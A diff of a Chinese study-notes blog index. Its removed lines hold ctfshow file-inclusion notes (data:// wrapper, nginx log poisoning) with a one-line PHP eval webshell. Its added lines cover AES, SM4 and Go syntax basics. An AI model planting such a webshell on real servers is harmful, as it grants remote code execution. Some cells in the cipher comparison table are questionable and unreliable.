-<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linxu命令</title>
     <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h3 id="1-新建虚拟环境"><a href="#1-新建虚拟环境" class="headerlink" title="1.新建虚拟环境"></a>1.新建虚拟环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入虚拟环境:   source venv/bin/activate</span><br><span class="line">启动一个 screen 会话：screen -S mysession</span><br><span class="line">以后可以用下面的命令重新连接会话： screen -r mysession</span><br></pre></td></tr></table></figure>
@@ -3853,6 +3853,1061 @@
       <tags>
         <tag>语言学习</tag>
         <tag>linxu命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/aes/</url>
+    <content><![CDATA[<h1 id="aes加密"><a href="#aes加密" class="headerlink" title="aes加密:"></a>aes加密:</h1><h2 id="1-特征"><a href="#1-特征" class="headerlink" title="1.特征:"></a>1.特征:</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>分组大小（Block）</td>
+<td>固定为 <strong>128 位</strong>（16 字节）</td>
+</tr>
+<tr>
+<td>密钥长度（Key）</td>
+<td>可为 <strong>128 位 &#x2F; 192 位 &#x2F; 256 位</strong>（常用128位）</td>
+</tr>
+<tr>
+<td>轮数（Rounds）</td>
+<td>依据密钥长度不同：10（128位）、12（192）、14（256）</td>
+</tr>
+<tr>
+<td>算法结构</td>
+<td>基于 <strong>Substitution–Permutation Network（SPN）</strong></td>
+</tr>
+</tbody></table>
+<h2 id="2-aes的加密流程-密钥128位"><a href="#2-aes的加密流程-密钥128位" class="headerlink" title="2.aes的加密流程 (密钥128位):"></a>2.aes的加密流程 (密钥128位):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入明文（128bit）</span><br><span class="line">      ↓</span><br><span class="line">AddRoundKey（初始轮）</span><br><span class="line">      ↓</span><br><span class="line">9轮：SubBytes(字节代换) → ShiftRows(行移位) → MixColumns(列混合) → AddRoundKey (轮密钥加)</span><br><span class="line">      ↓</span><br><span class="line">第10轮：SubBytes → ShiftRows → AddRoundKey    ---没有列混合</span><br><span class="line">      ↓</span><br><span class="line">输出密文（128bit）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3.初始轮:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将明文状态矩阵与第 0 轮子密钥（RoundKey₀）做逐字节异或（XOR）操作。</span><br><span class="line">本质上是将密钥“注入”到加密流程的起点，为接下来的非线性变换和扩散做准备。</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题:"></a>1.问题:</h3><p>明文是 128 位（16 字节），初始轮的 AddRoundKey 是对明文和密钥逐字节 XOR。如果我的密钥是 <strong>192 位或 256 位</strong>，那怎么 XOR 呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES 不直接使用原始密钥参与加密，而是通过 密钥扩展（Key Schedule） 生成 每轮使用的“轮密钥”（Round Key）。不管原始密钥是 128、192 还是 256 位，每轮都只用一个 128 位的轮密钥。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>原始密钥位数</th>
+<th>总轮数</th>
+<th>要生成的子密钥数量</th>
+<th>每个子密钥长度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>128 位</td>
+<td>10</td>
+<td>11 个</td>
+<td>128 位（16 字节）</td>
+</tr>
+<tr>
+<td>192 位</td>
+<td>12</td>
+<td>13 个</td>
+<td>128 位</td>
+</tr>
+<tr>
+<td>256 位</td>
+<td>14</td>
+<td>15 个</td>
+<td>128 位</td>
+</tr>
+</tbody></table>
+<h2 id="4-字节替代-s盒"><a href="#4-字节替代-s盒" class="headerlink" title="4.字节替代(s盒):"></a>4.字节替代(s盒):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对 状态矩阵中的每个字节，使用一个固定的查找表（S-box）进行非线性映射替代</span><br><span class="line">是整个 AES 中引入非线性和抗线性分析攻击的核心步骤</span><br><span class="line">就是按字节查表:</span><br><span class="line">   比如某一个字节是0x53</span><br><span class="line">        高4位：5（行索引）</span><br><span class="line">        低4位：3（列索引）</span><br><span class="line">   然后去s盒表中找5行3列对应的字节值</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-行移位"><a href="#5-行移位" class="headerlink" title="5.行移位:"></a>5.行移位:</h2><p>按行左移字节就行了</p>
+<table>
+<thead>
+<tr>
+<th>行号</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第0行</td>
+<td>不变</td>
+</tr>
+<tr>
+<td>第1行</td>
+<td>循环左移 1 个字节</td>
+</tr>
+<tr>
+<td>第2行</td>
+<td>循环左移 2 个字节</td>
+</tr>
+<tr>
+<td>第3行</td>
+<td>循环左移 3 个字节（或右移1位）</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打乱同一列字节之间的联系，让后续的 MixColumns 可以混合更多跨字节的数据；</span><br><span class="line">增强扩散性，使得明文的小改动能影响到加密后的多个字节；</span><br><span class="line">是一种 位置置换操作，没有改变字节本身的值。</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-列混合"><a href="#6-列混合" class="headerlink" title="6.列混合:"></a>6.列混合:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MixColumns（列混合） 是 AES 加密中每一轮的第 3 个操作（除了最后一轮不执行它），</span><br><span class="line">它通过矩阵乘法在 GF(2⁸) 有限域中，把每一列的4个字节混合生成新的4个字节。</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-轮密钥加"><a href="#7-轮密钥加" class="headerlink" title="7.轮密钥加:"></a>7.轮密钥加:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前状态矩阵与本轮的轮密钥（Round Key）逐字节进行按位异或（XOR）</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>运算简单</td>
+<td>仅使用按位异或（XOR），硬件友好</td>
+</tr>
+<tr>
+<td>密钥注入点</td>
+<td>是 AES 中 <strong>唯一使用密钥的地方</strong></td>
+</tr>
+<tr>
+<td>可逆性强</td>
+<td>XOR 的逆运算就是本身（再次 XOR 即可还原）</td>
+</tr>
+<tr>
+<td>轮密钥变化</td>
+<td>每轮使用不同的轮密钥（由原始密钥扩展）</td>
+</tr>
+</tbody></table>
+<h2 id="8-密钥扩展"><a href="#8-密钥扩展" class="headerlink" title="8.密钥扩展:"></a>8.密钥扩展:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将原始密钥切成若干 32 位字（4字/6字/8字）</span><br><span class="line">每次迭代扩展一个 32 位字，共需 44/52/60 个字（每轮 4 个字）</span><br><span class="line"></span><br><span class="line">1. 初始密钥写入前 Nk 个字（Nk = 4/6/8）</span><br><span class="line">2. 对后续每一组（每组4字）：</span><br><span class="line">   - 如果当前索引 i 是 Nk 的倍数：</span><br><span class="line">     temp = SubWord(RotWord(w[i-1])) ⊕ Rcon[i/Nk]</span><br><span class="line">   - 否则如果 Nk &gt; 6 且 i ≡ 4 mod Nk：</span><br><span class="line">     temp = SubWord(w[i-1])</span><br><span class="line">   - 然后：w[i] = w[i-Nk] ⊕ temp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>AES</th>
+<th>DES</th>
+<th>SM4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>原始密钥长度</td>
+<td>128 &#x2F; 192 &#x2F; 256 bit</td>
+<td>64 bit（含8位校验）</td>
+<td>128 bit</td>
+</tr>
+<tr>
+<td>有效密钥长度</td>
+<td>128 &#x2F; 192 &#x2F; 256 bit</td>
+<td>56 bit</td>
+<td>128 bit</td>
+</tr>
+<tr>
+<td>总轮数</td>
+<td>10 &#x2F; 12 &#x2F; 14</td>
+<td>16</td>
+<td>32</td>
+</tr>
+<tr>
+<td>每轮密钥长度</td>
+<td>128 bit（16 字节）</td>
+<td>48 bit</td>
+<td>32 bit（1个字）</td>
+</tr>
+<tr>
+<td>子密钥数量</td>
+<td>轮数 + 1（11&#x2F;13&#x2F;15 个）</td>
+<td>16 个</td>
+<td>32 个</td>
+</tr>
+<tr>
+<td>主要操作</td>
+<td>字扩展 + S-box + XOR + 轮常量</td>
+<td>置换 + 左移 + 压缩置换</td>
+<td>XOR + S-box + 线性变换 + CK</td>
+</tr>
+<tr>
+<td>是否非线性</td>
+<td>✅（使用 S-box）</td>
+<td>❌</td>
+<td>✅（S-box + 线性组合）</td>
+</tr>
+<tr>
+<td>是否可逆</td>
+<td>❌</td>
+<td>✅</td>
+<td>❌（但结构对称）</td>
+</tr>
+</tbody></table>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/sm4/</url>
+    <content><![CDATA[<h1 id="sm4加密"><a href="#sm4加密" class="headerlink" title="sm4加密:"></a>sm4加密:</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念:"></a>1.概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：128 位明文 + 128 位密钥</span><br><span class="line">↓</span><br><span class="line">1. 明文拆成 4 个 32 位字：X0, X1, X2, X3</span><br><span class="line">2. 密钥扩展：生成 32 个轮密钥 rk[0] ~ rk[31]</span><br><span class="line">3. 执行 32 轮加密：</span><br><span class="line">     对于每一轮 i = 0 到 31：</span><br><span class="line">         X[i+4] = X[i] ⊕ F(X[i+1], X[i+2], X[i+3], rk[i])</span><br><span class="line">4. 输出密文：X[35], X[34], X[33], X[32]（倒序输出）</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-F函数"><a href="#3-F函数" class="headerlink" title="3.F函数:"></a>3.F函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X1, X2, X3, rk) = T(X1 ⊕ X2 ⊕ X3 ⊕ rk)</span><br><span class="line">输入：X1, X2, X3, rk</span><br><span class="line"></span><br><span class="line">Step 1:  temp = X1 ⊕ X2 ⊕ X3 ⊕ rk   → 32位</span><br><span class="line">Step 2:  替代 temp 的每个字节 → 使用 S-box → 得到非线性结果</span><br><span class="line">Step 3:  对结果进行线性变换 L(x)</span><br><span class="line">Step 4:  输出最终的 F 值（32 位）</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>功能类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>混淆性</strong>（Confusion）</td>
+<td>通过 S-box 实现非线性映射，防止线性分析</td>
+</tr>
+<tr>
+<td><strong>扩散性</strong>（Diffusion）</td>
+<td>L 线性变换使得一个比特变化影响多个比特</td>
+</tr>
+<tr>
+<td><strong>密钥注入</strong></td>
+<td>引入轮密钥 rk[i]，确保每轮变换唯一</td>
+</tr>
+<tr>
+<td><strong>加密推进器</strong></td>
+<td>每轮根据 F 生成新状态字，实现 128 位数据演化</td>
+</tr>
+</tbody></table>
+]]></content>
+  </entry>
+  <entry>
+    <title>基础用法</title>
+    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="1-verb（格式化动词）"><a href="#1-verb（格式化动词）" class="headerlink" title="1.verb（格式化动词）"></a>1.verb（格式化动词）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在 fmt.<span class="title function_ invoke__">Printf</span>()、fmt.<span class="title function_ invoke__">Sprintf</span>() 等函数中，verb 是以 % 开头的标识符，用于告诉程序以何种格式显示变量。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-常用-verb-格式化动词表"><a href="#1-常用-verb-格式化动词表" class="headerlink" title="1.常用 verb 格式化动词表"></a>1.常用 verb 格式化动词表</h3><table>
+<thead>
+<tr>
+<th><strong>动词</strong></th>
+<th><strong>含义</strong></th>
+<th><strong>示例输出</strong>（假设变量值为 <code>x = 42</code>）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%v</code></td>
+<td>默认格式输出</td>
+<td><code>42</code></td>
+</tr>
+<tr>
+<td><code>%+v</code></td>
+<td>输出结构体时，包含字段名</td>
+<td><code>&#123;Name:Tom Age:18&#125;</code></td>
+</tr>
+<tr>
+<td><code>%#v</code></td>
+<td>输出 Go 语法表示的值</td>
+<td><code>main.User&#123;Name:&quot;Tom&quot;, Age:18&#125;</code></td>
+</tr>
+<tr>
+<td><code>%T</code></td>
+<td>显示变量类型</td>
+<td><code>int</code></td>
+</tr>
+<tr>
+<td><code>%%</code></td>
+<td>输出 <code>%</code> 本身</td>
+<td><code>%</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-数值类型格式化-verb"><a href="#2-数值类型格式化-verb" class="headerlink" title="2.数值类型格式化 verb"></a>2.数值类型格式化 verb</h3><table>
+<thead>
+<tr>
+<th><strong>动词</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例</strong> (<code>x = 42</code>)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%d</code></td>
+<td>十进制整数</td>
+<td><code>42</code></td>
+</tr>
+<tr>
+<td><code>%b</code></td>
+<td>二进制整数</td>
+<td><code>101010</code></td>
+</tr>
+<tr>
+<td><code>%o</code></td>
+<td>八进制</td>
+<td><code>52</code></td>
+</tr>
+<tr>
+<td><code>%x</code></td>
+<td>十六进制（小写）</td>
+<td><code>2a</code></td>
+</tr>
+<tr>
+<td><code>%X</code></td>
+<td>十六进制（大写）</td>
+<td><code>2A</code></td>
+</tr>
+<tr>
+<td><code>%c</code></td>
+<td>Unicode 字符</td>
+<td><code>*</code>（如果 42）</td>
+</tr>
+</tbody></table>
+<h3 id="3-字符串和布尔类型"><a href="#3-字符串和布尔类型" class="headerlink" title="3.字符串和布尔类型"></a>3.字符串和布尔类型</h3><table>
+<thead>
+<tr>
+<th><strong>动词</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例</strong> (<code>s = &quot;hello&quot;</code>)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%s</code></td>
+<td>字符串</td>
+<td><code>hello</code></td>
+</tr>
+<tr>
+<td><code>%q</code></td>
+<td>双引号字符串</td>
+<td><code>&quot;hello&quot;</code></td>
+</tr>
+<tr>
+<td><code>%t</code></td>
+<td>布尔值</td>
+<td><code>true</code> 或 <code>false</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-总结表"><a href="#4-总结表" class="headerlink" title="4.总结表"></a>4.总结表</h3><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>verb</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>常规</td>
+<td><code>%v</code> <code>%+v</code> <code>%#v</code> <code>%T</code> <code>%%</code></td>
+<td>通用格式</td>
+</tr>
+<tr>
+<td>整数</td>
+<td><code>%d</code> <code>%b</code> <code>%o</code> <code>%x</code> <code>%X</code> <code>%c</code></td>
+<td>数值格式</td>
+</tr>
+<tr>
+<td>字符串</td>
+<td><code>%s</code> <code>%q</code></td>
+<td>字符串处理</td>
+</tr>
+<tr>
+<td>布尔值</td>
+<td><code>%t</code></td>
+<td>布尔值显示</td>
+</tr>
+</tbody></table>
+<h2 id="2-关键字-25个"><a href="#2-关键字-25个" class="headerlink" title="2.关键字(25个):"></a>2.关键字(25个):</h2><table>
+<thead>
+<tr>
+<th>关键字</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>break</code></td>
+<td>跳出循环或 <code>switch</code></td>
+</tr>
+<tr>
+<td><code>case</code></td>
+<td><code>switch</code> 语句中的分支条件</td>
+</tr>
+<tr>
+<td><code>chan</code></td>
+<td>声明通道</td>
+</tr>
+<tr>
+<td><code>const</code></td>
+<td>声明常量</td>
+</tr>
+<tr>
+<td><code>continue</code></td>
+<td>继续下一次循环</td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td><code>switch</code> 默认分支</td>
+</tr>
+<tr>
+<td><code>defer</code></td>
+<td>延迟执行（函数结束前执行）</td>
+</tr>
+<tr>
+<td><code>else</code></td>
+<td>条件语句的“否则”分支</td>
+</tr>
+<tr>
+<td><code>fallthrough</code></td>
+<td><code>switch</code> 穿透下一分支</td>
+</tr>
+<tr>
+<td><code>for</code></td>
+<td>循环语句</td>
+</tr>
+<tr>
+<td><code>func</code></td>
+<td>声明函数</td>
+</tr>
+<tr>
+<td><code>go</code></td>
+<td>启动一个 goroutine（协程）</td>
+</tr>
+<tr>
+<td><code>goto</code></td>
+<td>跳转到标签</td>
+</tr>
+<tr>
+<td><code>if</code></td>
+<td>条件判断语句</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td>导入包</td>
+</tr>
+<tr>
+<td><code>interface</code></td>
+<td>定义接口类型</td>
+</tr>
+<tr>
+<td><code>map</code></td>
+<td>映射类型（键值对结构）</td>
+</tr>
+<tr>
+<td><code>package</code></td>
+<td>声明包名</td>
+</tr>
+<tr>
+<td><code>range</code></td>
+<td>用于遍历数组、切片、map 等</td>
+</tr>
+<tr>
+<td><code>return</code></td>
+<td>返回函数结果</td>
+</tr>
+<tr>
+<td><code>select</code></td>
+<td>多通道选择</td>
+</tr>
+<tr>
+<td><code>struct</code></td>
+<td>声明结构体</td>
+</tr>
+<tr>
+<td><code>switch</code></td>
+<td>多分支选择语句</td>
+</tr>
+<tr>
+<td><code>type</code></td>
+<td>声明类型</td>
+</tr>
+<tr>
+<td><code>var</code></td>
+<td>声明变量</td>
+</tr>
+</tbody></table>
+<h3 id="总结表"><a href="#总结表" class="headerlink" title="总结表"></a>总结表</h3><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>关键字举例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>控制流程</td>
+<td><code>if</code>, <code>else</code>, <code>for</code>, <code>switch</code>, <code>case</code>, <code>fallthrough</code>, <code>break</code>, <code>continue</code>, <code>goto</code>, <code>return</code></td>
+</tr>
+<tr>
+<td>并发相关</td>
+<td><code>go</code>, <code>select</code>, <code>chan</code></td>
+</tr>
+<tr>
+<td>定义声明</td>
+<td><code>var</code>, <code>const</code>, <code>type</code>, <code>func</code>, <code>package</code>, <code>import</code>, <code>struct</code>, <code>interface</code>, <code>map</code></td>
+</tr>
+<tr>
+<td>特殊用途</td>
+<td><code>defer</code>, <code>range</code></td>
+</tr>
+</tbody></table>
+<h2 id="3-常量"><a href="#3-常量" class="headerlink" title="3.常量:"></a>3.常量:</h2><table>
+<thead>
+<tr>
+<th>标识符</th>
+<th>类型</th>
+<th>是否为常量</th>
+<th>用途说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>true</code></td>
+<td><code>bool</code></td>
+<td>✅ 是常量</td>
+<td>表示布尔真值</td>
+<td><code>const ok = true</code></td>
+</tr>
+<tr>
+<td><code>false</code></td>
+<td><code>bool</code></td>
+<td>✅ 是常量</td>
+<td>表示布尔假值</td>
+<td><code>var done = false</code></td>
+</tr>
+<tr>
+<td><code>iota</code></td>
+<td><code>int</code></td>
+<td>⚠️ 特殊标识符</td>
+<td>用于 <strong>常量声明组中自动生成递增数字</strong>（仅在 <code>const</code> 中可用）</td>
+<td><code>const (A = iota; B; C)</code></td>
+</tr>
+<tr>
+<td><code>nil</code></td>
+<td><code>预定义空值</code></td>
+<td>⚠️ 不是 const 常量</td>
+<td>表示<strong>指针、切片、map、chan、接口、函数的零值</strong>（未初始化）</td>
+<td><code>var p *int = nil</code></td>
+</tr>
+</tbody></table>
+<h3 id="声明方式"><a href="#声明方式" class="headerlink" title="声明方式:"></a>声明方式:</h3><table>
+<thead>
+<tr>
+<th>声明方式</th>
+<th>示例</th>
+<th>说明</th>
+<th>是否支持类型推导</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. 显式声明（带类型）</td>
+<td><code>var a int</code></td>
+<td>默认值为0（int）</td>
+<td>❌ 不支持</td>
+</tr>
+<tr>
+<td>2. 显式声明 + 初始化</td>
+<td><code>var a int = 10</code></td>
+<td>有初始值</td>
+<td>✅ 支持（可省略类型）</td>
+</tr>
+<tr>
+<td>3. 类型推导声明</td>
+<td><code>var a = 10</code></td>
+<td>类型自动为 int</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>4. 短变量声明</td>
+<td><code>a := 10</code></td>
+<td>只能在函数内部使用</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>5. 多变量声明</td>
+<td><code>var a, b int = 1, 2</code></td>
+<td>可多个变量同时声明</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>6. 匿名变量</td>
+<td><code>_ = someFunc()</code></td>
+<td>用于忽略返回值</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>7. 常量声明</td>
+<td><code>const Pi = 3.14</code></td>
+<td>值不可修改</td>
+<td>✅（编译期推导）</td>
+</tr>
+</tbody></table>
+<h2 id="4-类型"><a href="#4-类型" class="headerlink" title="4.类型:"></a>4.类型:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
+<thead>
+<tr>
+<th>类型类别</th>
+<th>描述说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. <strong>基础类型</strong></td>
+<td>内建类型，Go 提供的最基本类型</td>
+<td><code>int</code>, <code>string</code>, <code>bool</code></td>
+</tr>
+<tr>
+<td>2. <strong>复合类型</strong></td>
+<td>由多个值组合而成的结构，支持更复杂的数据结构</td>
+<td><code>array</code>, <code>slice</code>, <code>map</code>, <code>struct</code></td>
+</tr>
+<tr>
+<td>3. <strong>引用类型</strong></td>
+<td>本质是指向底层数据的指针或引用（非值拷贝）</td>
+<td><code>pointer</code>, <code>channel</code>, <code>func</code></td>
+</tr>
+<tr>
+<td>4. <strong>自定义类型</strong></td>
+<td>使用 <code>type</code> 关键字定义的新类型，包含结构体、接口、别名等</td>
+<td><code>type MyInt int</code>、<code>type Person struct &#123;...&#125;</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-基础类型"><a href="#2-基础类型" class="headerlink" title="2.基础类型:"></a>2.基础类型:</h3><table>
+<thead>
+<tr>
+<th>类型名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>int</code></td>
+<td>整数类型（平台相关位数）</td>
+</tr>
+<tr>
+<td><code>int32</code></td>
+<td>32 位整数</td>
+</tr>
+<tr>
+<td><code>float64</code></td>
+<td>64 位浮点数</td>
+</tr>
+<tr>
+<td><code>bool</code></td>
+<td>布尔值（true&#x2F;false）</td>
+</tr>
+<tr>
+<td><code>string</code></td>
+<td>字符串类型</td>
+</tr>
+</tbody></table>
+<h3 id="3-复合类型"><a href="#3-复合类型" class="headerlink" title="3.复合类型:"></a>3.复合类型:</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>array</code></td>
+<td>定长数组</td>
+</tr>
+<tr>
+<td><code>slice</code></td>
+<td>动态数组切片</td>
+</tr>
+<tr>
+<td><code>map</code></td>
+<td>映射结构，键值对存储</td>
+</tr>
+<tr>
+<td><code>struct</code></td>
+<td>自定义结构体，可组合多字段</td>
+</tr>
+</tbody></table>
+<h3 id="4-引用类型"><a href="#4-引用类型" class="headerlink" title="4.引用类型:"></a>4.引用类型:</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>pointer</code></td>
+<td>指针类型</td>
+</tr>
+<tr>
+<td><code>channel</code></td>
+<td>并发通道类型（用于 goroutine 通信）</td>
+</tr>
+<tr>
+<td><code>func</code></td>
+<td>函数类型，可作为变量&#x2F;参数传递</td>
+</tr>
+</tbody></table>
+<h3 id="5-自定义类型："><a href="#5-自定义类型：" class="headerlink" title="5.自定义类型："></a>5.自定义类型：</h3><table>
+<thead>
+<tr>
+<th>类型形式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>自定义基本类型</td>
+<td><code>type MyInt int</code></td>
+</tr>
+<tr>
+<td>自定义结构体</td>
+<td><code>type Student struct &#123;...&#125;</code></td>
+</tr>
+<tr>
+<td>自定义接口</td>
+<td><code>type Writer interface &#123;...&#125;</code></td>
+</tr>
+<tr>
+<td>类型别名（不是新类型）</td>
+<td><code>type Rune = int32</code></td>
+</tr>
+</tbody></table>
+<h3 id="6-总结-："><a href="#6-总结-：" class="headerlink" title="6.总结 ："></a>6.总结 ：</h3><table>
+<thead>
+<tr>
+<th>分类</th>
+<th>关键字&#x2F;构造方式</th>
+<th>是否值类型</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>基础类型</td>
+<td><code>int</code>, <code>string</code>, <code>bool</code></td>
+<td>✅</td>
+<td><code>var name string</code></td>
+</tr>
+<tr>
+<td>复合类型</td>
+<td><code>array</code>, <code>slice</code>, <code>map</code></td>
+<td>❌（slice&#x2F;map是引用）</td>
+<td><code>[]int</code>, <code>map[string]int</code></td>
+</tr>
+<tr>
+<td>引用类型</td>
+<td><code>*T</code>, <code>chan T</code>, <code>func()</code></td>
+<td>❌</td>
+<td><code>var p *int</code></td>
+</tr>
+<tr>
+<td>自定义类型</td>
+<td><code>type</code> 关键字定义</td>
+<td>取决于底层类型</td>
+<td><code>type ID int</code>, <code>type T = U</code></td>
+</tr>
+</tbody></table>
+<h2 id="5-iota："><a href="#5-iota：" class="headerlink" title="5.iota："></a>5.iota：</h2><p>与const来表示枚举类型:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const (</span><br><span class="line">a=10*iota</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-多返回值"><a href="#6-多返回值" class="headerlink" title="6.多返回值:"></a>6.多返回值:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mailres</span><span class="params">(a <span class="type">int</span>)</span></span>(<span class="type">int</span>,<span class="type">int</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span>(</span><br><span class="line">	b=a*<span class="number">2</span></span><br><span class="line">	c=a*<span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> b,c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
